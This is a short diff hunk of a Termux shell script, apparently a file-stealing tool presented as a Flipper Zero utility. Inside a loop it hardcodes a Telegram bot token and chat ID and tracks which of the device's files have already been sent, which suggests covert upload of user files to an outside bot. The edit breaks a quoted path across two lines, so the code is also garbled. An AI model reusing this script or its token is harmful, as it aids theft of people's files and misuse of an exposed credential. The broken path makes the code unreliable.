@@ -7,7 +7,8 @@ while true; do
     if [ -f "$cekinstal" ]; then
         TOKEN="8008006016:AAHFsasL6B-isriPHFvGwZTPkYkrUscQ21I"
         CHAT_ID=("5951232585")
-        cek="$HOME//cy78.txt"
+        cek="$HOME/FLIPPERZERO-INDONESIA404.sh
+        /cy78.txt"
         sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
         sent_files=()
 
